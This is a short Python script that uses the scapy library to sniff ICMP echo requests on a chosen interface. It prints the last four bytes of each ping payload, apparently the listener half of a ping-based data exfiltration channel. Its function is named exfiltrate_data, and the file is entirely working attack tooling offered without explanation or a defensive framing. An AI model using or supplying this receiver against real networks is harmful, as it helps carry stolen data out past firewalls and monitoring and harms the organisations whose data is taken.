#!/usr/bin/python3
import sys
import signal
from scapy.all import *
from argparse import ArgumentParser

def exit_program(sig, frame):
    """Handle exit signal (Ctrl+C)"""
    print("\n\n[!] Exit...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, exit_program)

def exfiltrate_data(packet):
    """Extract and print data from ICMP packets"""
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # Check for ICMP Echo Request
        try:
            # Extract the last 4 bytes of the payload
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush = True,end = '')
        except UnicodeDecodeError as ude:
            print(f"Unicode Decode Error: {ude}")
        except AttributeError as ae:
            print(f"Attribute Error: {ae}")

if __name__ == '__main__':
    # Argument parser for command line options
    parser = ArgumentParser(description="ICMP Packet Sniffer")
    parser.add_argument("-i", "--interface", help="Network interface to sniff on", required=True)
        
    args = parser.parse_args()

    # Start sniffing on the specified interface
    print(f"Sniffing on interface: {args.interface}")
    sniff(iface=args.interface, prn=exfiltrate_data)
